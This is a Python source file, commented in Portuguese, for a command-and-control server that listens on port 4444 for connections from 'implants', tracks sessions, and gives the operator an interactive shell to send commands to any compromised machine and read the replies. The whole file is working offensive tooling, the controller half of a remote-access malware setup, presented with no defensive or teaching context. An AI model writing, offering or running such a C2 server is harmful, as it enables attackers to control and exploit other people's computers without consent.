import socket
import threading
import time

class C2Server:
    """
    Servidor de Comando e Controle (C2) para gerenciar múltiplos implantes.
    Este servidor escuta por conexões, gerencia sessões e permite a interação
    com cada implante individualmente.
    """
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sessions = []
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.shutdown_flag = threading.Event()

    def listen_for_connections(self):
        """Inicia o servidor e escuta por conexões de implantes."""
        self.sock.bind((self.host, self.port))
        self.sock.listen(5)
        print(f"[+] Escutando por conexões em {self.host}:{self.port}")

        while not self.shutdown_flag.is_set():
            try:
                conn, addr = self.sock.accept()
                session = {'conn': conn, 'addr': addr, 'active': True}
                self.sessions.append(session)
                print(f"\n[+] Nova conexão recebida de {addr[0]}:{addr[1]}")
            except socket.error:
                break
        print("\n[*] O listener de conexões foi encerrado.")


    def list_sessions(self):
        """Lista todas as sessões ativas (implantes conectados)."""
        print("\n--- Sessões Ativas ---")
        if not self.sessions:
            print("Nenhuma sessão ativa encontrada.")
            return

        for i, session in enumerate(self.sessions):
            # Verifica se a conexão ainda está viva antes de listar
            try:
                session['conn'].send(b'ping')
                # Pequena espera para ver se ocorre um erro
                time.sleep(0.1) 
                print(f"  ID: {i} | Endereço: {session['addr'][0]}:{session['addr'][1]}")
            except (socket.error, BrokenPipeError):
                print(f"  ID: {i} | Endereço: {session['addr'][0]}:{session['addr'][1]} (Desconectado)")
                session['active'] = False
        
        # Limpa sessões inativas
        self.sessions = [s for s in self.sessions if s['active']]
        print("---------------------\n")

    def interact_with_session(self, session_id):
        """Inicia uma shell interativa com um implante específico."""
        try:
            session_id = int(session_id)
            if 0 <= session_id < len(self.sessions):
                session = self.sessions[session_id]
                conn = session['conn']
                addr = session['addr']
                print(f"\n[+] Interagindo com a sessão {session_id} ({addr[0]})")
                print("Digite 'quit' ou 'exit' para retornar ao menu principal.\n")

                while True:
                    command = input(f"shell@{addr[0]}> ")
                    if command.lower() in ['quit', 'exit']:
                        break
                    if not command:
                        continue

                    try:
                        conn.send(command.encode('utf-8'))
                        response = conn.recv(4096).decode('utf-8', errors='ignore')
                        print(response)
                    except (socket.error, BrokenPipeError):
                        print(f"[-] A conexão com a sessão {session_id} foi perdida.")
                        session['active'] = False
                        self.sessions = [s for s in self.sessions if s['active']]
                        break
            else:
                print("[-] ID de sessão inválido.")
        except ValueError:
            print("[-] ID de sessão inválido. Por favor, insira um número.")
        except Exception as e:
            print(f"[-] Ocorreu um erro: {e}")

    def run_console(self):
        """Executa o console principal do C2 para gerenciamento."""
        print("\nBem-vindo ao Console do C2.")
        print("Comandos disponíveis: list, select <ID>, exit")

        while not self.shutdown_flag.is_set():
            cmd_input = input("C2> ").strip().split()
            if not cmd_input:
                continue
            
            command = cmd_input[0].lower()

            if command == "list":
                self.list_sessions()
            elif command == "select":
                if len(cmd_input) > 1:
                    self.interact_with_session(cmd_input[1])
                else:
                    print("Uso: select <ID_da_Sessão>")
            elif command == "exit":
                print("[*] Encerrando o servidor C2...")
                self.shutdown_flag.set()
                for session in self.sessions:
                    session['conn'].close()
                self.sock.close()
                break
            else:
                print(f"Comando desconhecido: '{command}'")

    def start(self):
        """Inicia o servidor e seus componentes."""
        listener_thread = threading.Thread(target=self.listen_for_connections)
        listener_thread.daemon = True
        listener_thread.start()

        # Dá um tempo para o listener iniciar antes de mostrar o console
        time.sleep(0.5) 
        
        self.run_console()
        listener_thread.join() # Espera o thread do listener terminar


if __name__ == "__main__":
    HOST = '0.0.0.0'  # Escuta em todas as interfaces de rede
    PORT = 4444       # Porta para escutar
    server = C2Server(HOST, PORT)
    server.start()
